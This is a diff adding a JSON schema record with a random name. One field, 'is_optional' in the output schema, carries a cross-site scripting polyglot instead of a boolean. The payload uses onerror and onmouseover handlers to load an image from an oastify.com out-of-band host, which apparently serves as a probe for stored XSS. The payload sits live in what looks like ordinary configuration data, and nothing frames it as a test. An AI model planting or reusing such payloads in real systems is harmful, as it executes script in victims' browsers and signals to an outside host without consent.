@@ -1,0 +1,33 @@
+{
+	"createdTime":1736639335594,
+	"deleted":false,
+	"description":"otAyeP",
+	"id":"6783036744ce135db1da5c0a",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":854,
+	"lcName":"otayep",
+	"modifiedTime":1736639335594,
+	"name":"otAyeP",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":"javascript:/*</script><img/onerror='-/\"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/7x5feww0tlqx3le72g7vpkf12s8lwjkbbz3m0apX;.oastify.com/).replace(/.;/g,[])]//'src=>"
+			}
+		}
+	},
+	"ownerUserId":854,
+	"standard":false,
+	"version":0
+}
